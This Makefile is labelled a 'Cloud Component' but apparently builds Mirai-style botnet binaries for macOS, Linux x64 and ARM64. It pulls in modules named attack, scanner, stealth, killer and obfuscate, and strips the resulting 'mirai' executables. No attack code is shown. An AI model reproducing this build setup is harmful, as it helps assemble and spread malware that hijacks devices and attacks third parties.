# Pure Makefile for Cloud Component

CC ?= gcc
DIST_DIR ?= dist

# IoT Sources
DIR_IOT = crates/nodes/cloud
IOT_CFLAGS = -Wall -Wextra -O2 -std=c99 -D_GNU_SOURCE
IOT_CFLAGS += -I$(DIR_IOT)/modules/network/dns -I$(DIR_IOT)/modules/network/p2p -I$(DIR_IOT)/modules/network/proxy
IOT_CFLAGS += -I$(DIR_IOT)/modules/network/scanner -I$(DIR_IOT)/modules/network/proto
IOT_CFLAGS += -I$(DIR_IOT)/modules/attack -I$(DIR_IOT)/modules/attack/methods
IOT_CFLAGS += -I$(DIR_IOT)/modules/system/stealth -I$(DIR_IOT)/modules/system/killer -I$(DIR_IOT)/modules/system/obfuscate
IOT_CFLAGS += -I$(DIR_IOT)/modules/crypto -I$(DIR_IOT)/include

IOT_SRCS = $(DIR_IOT)/main.c \
           $(wildcard $(DIR_IOT)/modules/network/*/*.c) \
           $(wildcard $(DIR_IOT)/modules/attack/*.c) \
           $(wildcard $(DIR_IOT)/modules/attack/methods/*.c) \
           $(wildcard $(DIR_IOT)/modules/system/*/*.c) \
           $(wildcard $(DIR_IOT)/modules/crypto/*.c)

.PHONY: cloud_macos cloud_linux_x64 cloud_linux_arm64 clean

# MacOS Native (Host)
cloud_macos:
	@mkdir -p $(DIST_DIR)/cloud
	$(CC) $(IOT_CFLAGS) -o $(DIST_DIR)/cloud/mirai.macos $(IOT_SRCS)
	strip $(DIST_DIR)/cloud/mirai.macos

# Linux x86_64 (via Zig)
cloud_linux_x64:
	@mkdir -p $(DIST_DIR)/cloud
	zig cc -target x86_64-linux $(IOT_CFLAGS) -o $(DIST_DIR)/cloud/mirai.linux.x64 $(IOT_SRCS)
	strip $(DIST_DIR)/cloud/mirai.linux.x64

# Linux ARM64 (via Zig)
cloud_linux_arm64:
	@mkdir -p $(DIST_DIR)/cloud
	zig cc -target aarch64-linux $(IOT_CFLAGS) -o $(DIST_DIR)/cloud/mirai.linux.arm64 $(IOT_SRCS)
	strip $(DIST_DIR)/cloud/mirai.linux.arm64


clean:
	rm -rf $(DIST_DIR)
